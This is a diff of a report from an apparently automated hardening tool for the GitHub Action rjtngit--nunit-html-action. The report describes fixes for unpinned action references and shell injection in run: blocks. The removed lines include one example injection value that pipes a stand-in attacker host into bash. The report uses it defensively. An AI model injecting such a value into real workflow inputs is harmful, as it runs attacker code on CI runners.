@@ -14,36 +14,22 @@ Action **rjtngit--nunit-html-action/v2.0.0** was hardened automatically. 4 findi
 
 ## Findings Fixed
 
-### unpinned-uses (severity: high)
-
-action.yml uses `actions/setup-python@v6`, which is a mutable tag reference rather than a pinned 40-character commit SHA. This means the action could silently change to a different (potentially malicious) version without any notice. It should be pinned to a full SHA, e.g. `actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v6`.
-
-Locations:
-
-- `action.yml:14`
-
 ### script-injection (severity: high)
 
-The `run:` block directly interpolates GitHub Actions expressions into shell command strings (sub-rule a). Specifically:
-- `${{ github.action_path }}` is interpolated twice into shell commands (pip install and python invocation).
-- `${{ inputs.inputXmlPath }}` is interpolated directly as a positional argument to `python main.py` — this is fully caller-controlled and allows arbitrary shell metacharacter injection (e.g. a value like `foo; curl attacker.com | bash` would execute).
-- `${{ inputs.outputHtmlPath }}` is similarly interpolated directly as a positional argument.
-
-All `${{ ... }}` expressions inside `run:` blocks are substituted by the Actions runner before the shell ever sees the string, bypassing any shell quoting. The fix is to pass these values through `env:` variables and reference them as properly double-quoted shell variables, e.g.:
-```yaml
-env:
-  INPUT_XML_PATH: ${{ inputs.inputXmlPath }}
-  OUTPUT_HTML_PATH: ${{ inputs.outputHtmlPath }}
-  ACTION_PATH: ${{ github.action_path }}
-run: |
-  python -m pip install -r "$ACTION_PATH/requirements.txt"
-  python "$ACTION_PATH/main.py" "$INPUT_XML_PATH" ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"}
-```
+Sub-rule (a): the 'Run python script' step puts expressions straight into the run: script. Offending lines: `python -m pip install -r ${{ github.action_path }}/requirements.txt` and `python ${{ github.action_path }}/main.py ${{ inputs.inputXmlPath }} ${{ inputs.outputHtmlPath }}`. Because inputs.inputXmlPath and inputs.outputHtmlPath come from the calling workflow, a crafted value can inject shell commands. Fix: move the values into env: variables (ACTION_PATH from github.action_path, INPUT_XML_PATH, OUTPUT_HTML_PATH). Then double-quote them in the script, using ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"} for the optional output path.
 
 Locations:
 
-- `action.yml:19`
-- `action.yml:20`
+- `action.yml:21`
+- `action.yml:22`
+
+### unpinned-uses (severity: high)
+
+A composite step uses a tag ref instead of a full 40-character commit SHA: `uses: actions/setup-python@v6`.
+
+Locations:
+
+- `action.yml:15`
 
 ### static-inline-injection (severity: high)
 
@@ -65,9 +51,9 @@ Locations:
 
 ### Iteration 1
 
-**Fixes applied:** unpinned-uses, script-injection, static-inline-injection
+**Fixes applied:** script-injection, unpinned-uses, static-inline-injection
 
 **Notes:**
 
-1. Pinned actions/setup-python@v6 to full SHA ece7cb06caefa5fff74198d8649806c4678c61a1 with a # v6 comment. 2. Moved all ${{ }} expressions (github.action_path, inputs.inputXmlPath, inputs.outputHtmlPath) into an env: block on the 'Run python script' step. Shell script now references them as double-quoted variables: "$ACTION_PATH", "$INPUT_XML_PATH", and ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"} (the last uses the conditional expansion to avoid passing an empty argument for the optional output path).
+Pinned actions/setup-python to commit ece7cb06caefa5fff74198d8649806c4678c61a1 (tag v6). Moved github.action_path, inputs.inputXmlPath and inputs.outputHtmlPath into the step's env: block as ACTION_PATH, INPUT_XML_PATH and OUTPUT_HTML_PATH. The script now reads them as double-quoted variables. The optional output path uses ${OUTPUT_HTML_PATH:+"$OUTPUT_HTML_PATH"}, so when it's empty no argument is passed and the call to main.py gets the same number of arguments as before.
 
